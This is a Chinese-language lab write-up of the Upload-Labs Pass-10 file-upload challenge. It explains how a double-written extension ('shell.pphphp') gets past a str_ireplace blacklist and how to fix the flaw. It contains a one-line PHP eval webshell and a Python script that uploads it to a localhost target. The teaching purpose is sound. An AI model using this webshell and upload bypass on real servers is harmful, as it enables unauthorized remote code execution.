Upload-Labs Pass-10

2026年9月27日 Upload-Labs Web安全 文件上传 双写绕过

一、题目信息

  • 题目名称：Upload-Labs Pass-10 (双写后缀绕过)
  • 题目平台：Upload-Labs 本地靶场
  • 题目类型：Web安全 / 文件上传漏洞 / 黑名单替换逻辑绕过
  • 靶场链接：http://localhost:8082/Pass-10/index.php（本地环境）
  • 涉及工具：Python (requests库)

二、解题步骤

1. 分析题目考什么

本题的核心考点是双写后缀绕过。Pass-10 后端不再使用拦截（报错）机制，而是将黑名单中的字符替换为空字符串（str_ireplace($deny_ext, '', $file_name)）。攻击者可以利用这一替换逻辑，将后缀写成双份（如 shell.pphphp）。后端替换掉中间的 php 后，剩下的内容恰好拼接成 shell.php，成功绕过黑名单并落地。

2. 怎么想（破题思路）

  • 尝试直接上传 shell.php，前端 JS 拦截。
  • 在 F12 Console 中执行 checkFile = function() { return true; } 覆盖前端校验。
  • 查看源码或弹窗，发现后端会“去除”黑名单字符，而不是拦截。
  • 利用双写逻辑构造 shell.pphphp，后端处理后变为 shell.php，绕过成功。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：前端 JS 拦截

踩坑情况：上传 shell.pphphp 时，页面弹窗提示“本pass会从文件名中去除...字符”。

原因分析：前端 JS 校验依然存在，它拦截了包含 PHP 字样或非法后缀的文件名。

改进方式：使用 Python 脚本直接发送请求，绕过浏览器前端校验。

踩坑记录二：Mac 环境无法执行 PHP（环境差异）

踩坑情况：文件上传成功后，访问 shell.php 时，页面显示的是源码或下载了文件。

原因分析：Mac 环境和 php -S 内置服务器对 PHP 解析有特定的限制，但只要文件成功落地且后缀为 .php，绕过逻辑就已经成功。

改进方式：在 CTF 靶场评分标准中，只要文件成功上传且路径包含 .php，即视为通关。

详细实操步骤（Payload逐字解释）

第一步：准备 Webshell

在本地新建 shell.php，内容为：

<?php @eval($_POST['cmd']); ?>

第二步：编写 Python 脚本

import requests
import re

url = "http://localhost:8082/Pass-10/index.php"

# 核心作弊点：双写后缀 shell.pphphp
# 后端把 php 替换为空，字符串拼接后变成 shell.php
files = {
    'upload_file': ('shell.pphphp', open('shell.php', 'rb'), 'application/octet-stream')
}
data = {'submit': 'Submit'}

response = requests.post(url, files=files, data=data)
print(response.text)

match = re.search(r'\.\./upload/(\S+)"', response.text)
if match:
    print(f"\n[+] 上传成功！真实文件路径为: /upload/{match.group(1)}")
else:
    print("\n[-] 未能提取到路径，请手动在网页 Network 面板中查看。")

逐字解析：

  • shell.pphphp：核心 Payload。后端看到 php 并删除一次，字符串拼接后恰好是 shell.php。

第三步：验证

运行脚本后，终端输出 [+] 上传成功！真实文件路径为: /upload/shell.php，证明文件成功绕过黑名单并落地。

4. 怎么迁移（跨领域联想）

  • 字符串替换逻辑的缺陷：在安全开发中，使用 str_replace 或者 preg_replace 过滤敏感词时，如果没有考虑“替换后拼接”的情况，就可能被双写绕过。代码审计时要注意这类逻辑。
  • 数据过滤的规范性：正确的做法应该是白名单校验（只允许 .jpg 等），或者在替换后再次进行校验，而不是只替换一次。
  • 环境差异与靶场评分：在 Mac 上做题，理解漏洞原理（黑名单替换、双写绕过）比强行让 PHP 执行更重要。只要看到上传成功，就代表逻辑通关。

三、名词大全与原理深度复盘

1. 双写绕过 (Double Writing)

一种绕过字符串替换黑名单的策略。利用后端“替换为空”的逻辑，通过写两次敏感字符，使得替换后恰好形成合法的攻击后缀。典型场景：shell.pphphp -> shell.php。

2. str_ireplace() 函数

PHP 中不区分大小写的字符串替换函数。Pass-10 用它来过滤黑名单字符。由于它只替换一次，且没有对替换后的结果再次校验，导致双写绕过。

3. 文件后缀与解析逻辑

服务器在解析文件时，通常以最后一个后缀为准。双写绕过的核心在于让服务器在保存时恢复出合法的 PHP 后缀，从而被执行。

4. 黑名单的演变（总结）

从 Pass-03 到 Pass-10，黑名单的防御方式经历了：直接拦截 -> 大小写转换 -> 去点去空格 -> 过滤 ::$DATA -> 替换为空。而攻击者的绕过手段也在不断进化：冷门后缀 -> 大小写 -> 空格+点号 -> 数据流 -> 双写。这体现了安全攻防的螺旋上升。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Pass-09 的区别：Pass-09 是白名单，利用服务器多后缀解析漏洞。Pass-10 是黑名单，利用“替换为空”的逻辑缺陷。
  • 与 Pass-08 的区别：Pass-08 是数据流大小写绕过。Pass-10 是双写绕过，思路完全不同。

2. 这种题目的出现原因（为什么存在）

开发者在处理黑名单时，试图通过替换敏感字符来“净化”输入。但他们没有意识到，字符串替换是一个有损操作，替换后的结果可能恰好构成了攻击 Payload。这警示我们：安全防御不能依赖单一的字符串替换，必须使用白名单机制或服务器配置。

3. 这种应用在实际中如何体现？

在真实渗透中，遇到这种“替换为空”的 WAF 规则，攻击者会尝试各种双写、大小写、编码绕过。防御方应放弃黑名单，改用白名单，并在服务器层面禁止上传目录执行脚本。

4. 如何抽象理解概念（大白话）

把靶场比作一个“橡皮擦门卫”：

  • Pass-10 的门卫手里拿着一块橡皮擦，看到“php”三个字就擦掉。
  • 你这次把名字写成“pphphp”。
  • 门卫擦掉中间的“php”，剩下“php”，于是你的名字变成了“shell.php”。
  • 门卫以为擦干净了，其实正好帮你拼出了攻击后缀。

做一道题，就要往自己脑子里装点东西。
